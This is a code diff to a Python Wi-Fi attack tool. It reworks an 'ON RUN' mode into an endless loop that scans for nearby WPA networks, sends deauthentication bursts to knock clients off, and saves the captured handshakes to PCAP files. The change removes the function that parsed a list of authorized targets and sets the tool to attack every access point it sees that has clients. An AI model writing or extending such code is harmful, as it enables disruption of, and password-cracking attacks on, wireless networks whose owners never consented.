@@ -100,7 +100,6 @@ ON_RUN_LIVE_UPDATE_INTERVAL = 0.25
 ON_RUN_SCAN_PAUSE_SEC = 0.5
 ON_RUN_DISPLAY_LIMIT = 12
 ON_RUN_CONFIRM_PHRASE = "AUTHORIZED"
-ON_RUN_STATUS_REFRESH_SEC = 0.5
 ON_RUN_DEFAULT_BURST_CYCLE_SEC = 10.0
 ON_RUN_DEFAULT_BURST_COUNT = 8
 
@@ -873,15 +872,6 @@ def confirm_on_run_disclaimer() -> bool:
     return answer == ON_RUN_CONFIRM_PHRASE
 
 
-def parse_authorized_targets(raw_targets: str) -> Set[str]:
-    targets: Set[str] = set()
-    for item in raw_targets.split(","):
-        cleaned = item.strip().lower()
-        if cleaned:
-            targets.add(cleaned)
-    return targets
-
-
 def set_interface_channel(interface: str, channel: int) -> bool:
     result = subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, check=False)
     if result.returncode != 0:
@@ -1562,12 +1552,12 @@ def run_classic_handshaker(interface: str) -> None:
 def run_on_run_handshaker(interface: str) -> None:
     logging.info("")
     logging.info(style("ON RUN handshaker:", STYLE_BOLD))
-    logging.info("Classic handshaker flow with target set = ALL observed APs.")
-    logging.info("APs with active clients are processed first.")
+    logging.info("Continuous loop: short scan -> deauth burst -> capture handshake.")
+    logging.info("Only APs with observed clients are targeted. Ctrl+C to stop.")
     logging.info("")
 
-    scan_duration = prompt_int(
-        f"{style('Fast scan duration', STYLE_BOLD)} (seconds) "
+    scan_window = prompt_int(
+        f"{style('Scan window per round', STYLE_BOLD)} (seconds) "
         f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {ON_RUN_DEFAULT_SCAN_WINDOW_SEC}s): ",
         default=ON_RUN_DEFAULT_SCAN_WINDOW_SEC,
     )
@@ -1580,12 +1570,12 @@ def run_on_run_handshaker(interface: str) -> None:
 
     per_target_duration = prompt_int(
         f"{style('Capture window per AP', STYLE_BOLD)} (seconds) "
-        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = 15s): ",
-        default=15,
+        f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = 10s): ",
+        default=10,
     )
 
     deauth_burst_on_sec = 0.0
-    deauth_burst_cycle_sec = DEFAULT_DEAUTH_BURST_CYCLE_SEC
+    deauth_burst_cycle_sec = ON_RUN_DEFAULT_BURST_CYCLE_SEC
     if DEAUTH_AVAILABLE:
         logging.info("")
         raw_burst_on = input(
@@ -1607,8 +1597,8 @@ def run_on_run_handshaker(interface: str) -> None:
             min_cycle = deauth_burst_on_sec + 0.5
             deauth_burst_cycle_sec = prompt_float(
                 f"{style('Deauth burst cycle', STYLE_BOLD)} in seconds "
-                f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {DEFAULT_DEAUTH_BURST_CYCLE_SEC:.1f}): ",
-                default=DEFAULT_DEAUTH_BURST_CYCLE_SEC,
+                f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} = {ON_RUN_DEFAULT_BURST_CYCLE_SEC:.1f}): ",
+                default=ON_RUN_DEFAULT_BURST_CYCLE_SEC,
                 minimum=min_cycle,
             )
             if deauth_burst_cycle_sec <= deauth_burst_on_sec:
@@ -1616,82 +1606,126 @@ def run_on_run_handshaker(interface: str) -> None:
         else:
             logging.info("Deauth bursts disabled.")
 
-    logging.info("")
-    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start fast scan...")
-    aps = scan_networks(
-        interface,
-        scan_duration,
-        channels=channels,
-        hop_interval=ON_RUN_DEFAULT_HOP_INTERVAL,
-        update_interval=ON_RUN_LIVE_UPDATE_INTERVAL,
-    )
-    sorted_aps = sorted_access_points(aps)
-    targets = [
-        ap for ap in sorted_aps
-        if ap.security in {"WPA", "WPA2", "WPA3"} and ap.channel
-    ]
+    burst_count = max(4, min(128, int(round(deauth_burst_on_sec * 10)))) if deauth_burst_on_sec > 0 else ON_RUN_DEFAULT_BURST_COUNT
 
     logging.info("")
-    logging.info(style("ON RUN target set: ALL", STYLE_BOLD))
-    logging.info("Channel profile: %s", channel_profile)
-    for line in format_network_lines(targets, max_items=ON_RUN_DISPLAY_LIMIT):
-        logging.info("%s", line)
+    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start ON RUN loop...")
 
-    if not targets:
-        logging.info("No WPA/WPA2/WPA3 APs with known channels found.")
-        return
+    cumulative_aps: Dict[str, AccessPoint] = {}
+    captured_bssids: Set[str] = set()
+    completed: List[Dict[str, str]] = []
+    ap_stats: Dict[str, Dict] = {}
+    total_packets = 0
+    eapol_packets = 0
+    round_index = 0
 
-    logging.info("")
-    logging.info(
-        "ALL queue contains %s AP(s). Each AP gets up to %ss, then ON RUN moves on.",
-        len(targets),
-        per_target_duration,
-    )
-    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start ALL capture cycle...")
-
-    completed: List[Dict] = []
-    attempted = 0
     try:
-        for target_ap in targets:
-            attempted += 1
-            logging.info("")
-            logging.info(style("=" * 70, STYLE_BOLD))
-            logging.info(
-                "%s %s/%s: %s (%s)",
-                style("ON RUN ALL", COLOR_HEADER, STYLE_BOLD),
-                attempted,
-                len(targets),
-                format_ssid(target_ap.ssid),
-                target_ap.bssid,
+        while True:
+            round_index += 1
+            aps = scan_networks(
+                interface,
+                scan_window,
+                channels=channels,
+                hop_interval=ON_RUN_DEFAULT_HOP_INTERVAL,
+                update_interval=ON_RUN_LIVE_UPDATE_INTERVAL,
             )
-            logging.info(style("=" * 70, STYLE_BOLD))
-            if target_ap.channel:
-                set_interface_channel(interface, target_ap.channel)
+            merge_access_point_snapshots(cumulative_aps, aps)
 
-            summary = capture_full_handshakes(
+            candidates = [
+                ap
+                for ap in sorted_access_points(cumulative_aps)
+                if ap.security in {"WPA", "WPA2", "WPA3"}
+                and ap.channel
+                and ap.clients
+                and ap.bssid not in captured_bssids
+            ]
+
+            dashboard = format_on_run_dashboard(
                 interface=interface,
-                ap=target_ap,
-                total_duration_sec=per_target_duration,
-                deauth_burst_on_sec=deauth_burst_on_sec,
-                deauth_burst_cycle_sec=deauth_burst_cycle_sec,
-                stop_on_first_handshake=True,
-                output_dir=DEFAULT_HANDSHAKE_DIR,
+                elapsed=round_index,
+                current_channel=None,
+                channel_profile=channel_profile,
+                status=f"round {round_index}: scan complete",
+                aps=cumulative_aps,
+                ap_stats=ap_stats,
+                completed_handshakes=completed,
+                total_packets=total_packets,
+                eapol_packets=eapol_packets,
+                active_bursts_enabled=deauth_burst_on_sec > 0,
+                authorized_targets=captured_bssids,
+                burst_count=burst_count,
             )
-            if summary and summary.get("detected_handshakes", 0) > 0:
-                completed.append(
-                    {
-                        "ssid": target_ap.ssid,
-                        "bssid": target_ap.bssid,
-                        "path": summary["path"],
-                        "handshakes": summary["detected_handshakes"],
-                    }
-                )
+            render_on_run_dashboard(dashboard)
+
+            if not candidates:
+                logging.info("")
+                logging.info("No AP with observed clients this round. Rescanning...")
+                time.sleep(ON_RUN_SCAN_PAUSE_SEC)
+                continue
+
+            for target_ap in candidates:
+                if target_ap.bssid in captured_bssids:
+                    continue
+                logging.info("")
+                logging.info(style("=" * 70, STYLE_BOLD))
                 logging.info(
-                    "%s %s -> %s",
-                    style("✓", COLOR_SUCCESS, STYLE_BOLD),
+                    "%s %s (%s) | ch %s | clients %s",
+                    style("ON RUN", COLOR_HEADER, STYLE_BOLD),
                     format_ssid(target_ap.ssid),
-                    summary["path"],
+                    target_ap.bssid,
+                    target_ap.channel,
+                    len(target_ap.clients),
                 )
+                logging.info(style("=" * 70, STYLE_BOLD))
+                if target_ap.channel:
+                    set_interface_channel(interface, target_ap.channel)
+
+                summary = capture_full_handshakes(
+                    interface=interface,
+                    ap=target_ap,
+                    total_duration_sec=per_target_duration,
+                    deauth_burst_on_sec=deauth_burst_on_sec,
+                    deauth_burst_cycle_sec=deauth_burst_cycle_sec,
+                    stop_on_first_handshake=True,
+                    output_dir=DEFAULT_HANDSHAKE_DIR,
+                )
+                if not summary:
+                    continue
+
+                summary_eapol = int(summary.get("eapol_packets", 0))
+                summary_handshakes = int(summary.get("detected_handshakes", 0))
+                total_packets += int(summary.get("total_packets", 0))
+                eapol_packets += summary_eapol
+
+                stats = ap_stats.setdefault(target_ap.bssid, {"eapol": 0, "handshakes": 0})
+                stats["eapol"] += summary_eapol
+                stats["handshakes"] += summary_handshakes
+
+                if summary_handshakes > 0:
+                    captured_bssids.add(target_ap.bssid)
+                    completed.append(
+                        {
+                            "ssid": target_ap.ssid,
+                            "bssid": target_ap.bssid,
+                            "client": "",
+                            "path": summary["path"],
+                        }
+                    )
+                    logging.info(
+                        "%s %s -> %s",
+                        style("✓", COLOR_SUCCESS, STYLE_BOLD),
+                        format_ssid(target_ap.ssid),
+                        summary["path"],
+                    )
+                elif summary_eapol == 0:
+                    # No EAPOL at all: drop the empty PCAP to avoid junk files.
+                    try:
+                        if summary.get("path") and os.path.exists(summary["path"]):
+                            os.remove(summary["path"])
+                    except OSError:
+                        pass
+
+            time.sleep(ON_RUN_SCAN_PAUSE_SEC)
     except KeyboardInterrupt:
         logging.info("")
         logging.info("ON RUN stopped by user.")
